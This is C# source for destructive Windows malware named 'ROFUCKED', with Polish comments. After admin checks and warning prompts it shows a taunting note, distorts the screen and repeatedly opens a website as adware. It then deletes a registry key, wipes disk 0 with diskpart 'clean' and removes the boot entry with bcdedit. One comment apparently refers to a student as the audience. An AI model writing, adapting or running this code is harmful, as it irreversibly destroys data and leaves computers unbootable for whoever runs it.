using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Security.Principal;
using Microsoft.Win32;

class InternalSystemModule
{
    [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr hWnd);
    [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
    [DllImport("user32.dll")] static extern bool GetCursorPos(out Point lpPoint);
    [DllImport("user32.dll")] static extern IntPtr GetDesktopWindow();
    [DllImport("user32.dll")] static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

    [StructLayout(LayoutKind.Sequential)] public struct RECT { public int Left, Top, Right, Bottom; }
    const uint SRCCOPY = 0x00CC0020;
    const uint SRCINVERT = 0x00660046;
    static Random rnd = new Random();
    static bool destructionStarted = false;

    static bool IsAdmin() {
        try {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        } catch { return false; }
    }

    [STAThread]
    static void Main() {
        // Blokada zamykania: sprawdzamy admina
        if (!IsAdmin()) {
            MessageBox.Show("ERROR: Please run as Administrator!", "Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
            // Odpalamy CMD żeby uczeń widział komunikat
            Process.Start("cmd.exe", "/c color c && echo RUN AS ADMIN OR SYSTEM WILL NOT BE ROFUCKED! && pause");
            return;
        }

        try {
            Application.EnableVisualStyles();
            string msg = "This computer virus will destroy your computer beyond repair.\nAre you sure?";
            if (MessageBox.Show(msg, "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes) {
                if (MessageBox.Show("FINAL WARNING!", "ROFUCKED", MessageBoxButtons.YesNo, MessageBoxIcon.Error) == DialogResult.Yes) {
                    
                    // Start notatnika
                    new Thread(() => {
                        try {
                            string note = Path.Combine(Path.GetTempPath(), "readme.txt");
                            File.WriteAllText(note, "Your computer has been bricked by malware.\n\n:D\nEnjoy animations.");
                            Process.Start("notepad.exe", note);
                        } catch {}
                    }).Start();

                    // Start Malware
                    Thread t = new Thread(MalwarePayload);
                    t.SetApartmentState(ApartmentState.STA);
                    t.Start();

                    // Adware w tle
                    new Thread(() => {
                        while(true) {
                            try { Process.Start("https://chomikuj.pl"); } catch {}
                            Thread.Sleep(20000);
                        }
                    }).Start();

                    // Utrzymujemy proces przy życiu
                    while(true) { Thread.Sleep(1000); }
                }
            }
        } catch (Exception ex) {
            File.WriteAllText("error_log.txt", ex.ToString());
            MessageBox.Show("Crash: " + ex.Message);
        }
    }

    static void MalwarePayload() {
        IntPtr hdc = GetDC(IntPtr.Zero);
        RECT r; GetWindowRect(GetDesktopWindow(), out r);
        int w = r.Right, h = r.Bottom;
        Stopwatch sw = Stopwatch.StartNew();

        while (true) {
            long ms = sw.ElapsedMilliseconds;
            if (ms < 260000) {
                if (ms < 40000) Graphics.FromHdc(hdc).DrawIcon(SystemIcons.Error, rnd.Next(w), rnd.Next(h));
                else if (ms < 120000) {
                    if (rnd.Next(10) > 8) BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCINVERT);
                    BitBlt(hdc, rnd.Next(w), rnd.Next(h), 150, 150, hdc, rnd.Next(w), rnd.Next(h), SRCCOPY);
                }
                else if (ms < 200000) {
                    BitBlt(hdc, 10, 10, w - 20, h - 20, hdc, 0, 0, SRCCOPY);
                }
                else {
                    BitBlt(hdc, 0, 10, w, h - 10, hdc, 0, 0, SRCCOPY);
                    int s = (int)(Math.Sin(ms/400.0)*15);
                    BitBlt(hdc, s, 0, w, h, hdc, 0, 0, SRCCOPY);
                }
                Thread.Sleep(25);
            } else {
                if (!destructionStarted) {
                    destructionStarted = true;
                    new Thread(DoRoFucked).Start();
                }
                BitBlt(hdc, rnd.Next(-10, 10), rnd.Next(-10, 10), w, h, hdc, 0, 0, SRCCOPY);
                if (ms > 310000) {
                    FinalAnim f = new FinalAnim();
                    f.ShowDialog();
                    Process.Start("powershell.exe", "wininit");
                }
                Thread.Sleep(10);
            }
        }
    }

    static void DoRoFucked() {
        try {
            // Niszczenie rejestru - klucze krytyczne
            Registry.LocalMachine.DeleteSubKeyTree("Software\\Microsoft\\Windows\\CurrentVersion\\Run", false);
            // Diskpart
            string scr = Path.Combine(Path.GetTempPath(), "s.txt");
            File.WriteAllText(scr, "select disk 0\nclean");
            Process.Start("diskpart.exe", "/s " + scr);
            // Boot
            Process.Start("bcdedit", "/delete {current} /f");
        } catch {}
    }
}

public class FinalAnim : Form {
    int i = 0; float a = 0; string t = "Computer have been BRICKED. Enjoy \"Animation\"";
    public FinalAnim() {
        this.FormBorderStyle = 0; this.WindowState = FormWindowState.Maximized; this.BackColor = Color.Black; this.TopMost = true;
        System.Windows.Forms.Timer tm = new System.Windows.Forms.Timer { Interval = 100 };
        tm.Tick += (s, e) => { if (i < t.Length) i++; else a += 15; this.Invalidate(); };
        tm.Start();
    }
    protected override void OnPaint(PaintEventArgs e) {
        e.Graphics.DrawString(t.Substring(0, i), new Font("Consolas", 24, FontStyle.Bold), Brushes.Lime, 50, Height/2 - 100);
        if (i >= t.Length) {
            e.Graphics.TranslateTransform(Width/2, Height/2);
            e.Graphics.RotateTransform(a);
            e.Graphics.FillEllipse(Brushes.Gold, -100, -50, 200, 100);
            e.Graphics.FillPolygon(Brushes.Gold, new Point[] { new Point(80,0), new Point(150,-50), new Point(150,50) });
        }
    }
}
